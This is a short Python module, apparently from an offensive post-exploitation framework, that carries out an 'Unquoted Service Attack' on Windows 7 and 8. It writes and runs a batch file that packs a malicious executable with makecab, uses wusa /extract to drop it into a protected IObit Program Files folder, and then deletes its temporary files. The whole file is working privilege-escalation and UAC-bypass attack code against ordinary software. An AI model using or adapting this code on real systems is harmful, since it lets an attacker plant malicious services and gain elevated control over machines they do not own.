from module import Module
from subprocess import check_call, check_output
from os import system, getcwd

class BoomerModule(Module):

    def __init__(self):
        info = {
                "Name": "Unquoted Service Attack",
                "Description": "Look for .exe with autoElevate true",
                "OS": "Windows 7, 8, 8.1",
                "Author": "Josue Encinar",
        }
        options = {
            "malicious_service": ["Service .exe to copy", "C:\\Users\\Josue\\Desktop\\Advanced.exe", True],
            "destination": ["Path to paste .exe", '"C:\\Program Files (x86)\\IObit"', True],
            "service_name": ["Service name", "AdvancedSystemCareService9", True]
        }
        super(BoomerModule, self).__init__(options,info)
    
    def run(self):
        self.print_info("Moving %s to %s"%(self.options["malicious_service"][1],self.options["destination"][1]))
        evil = getcwd() + "\\evil.tmp"
        data = """
        @echo off
        makecab %s %s
        @echo.
        echo 'makecab done'
        wusa %s /extract:%s
        echo 'wusa done!'
        del %s
        """%( self.options["malicious_service"][1], evil, evil, self.options["destination"][1], evil)
        f = open("tmp.bat", "w")
        f.write(data)

        f.close()
        check_call(["tmp.bat"])
        system("del tmp.bat > $null")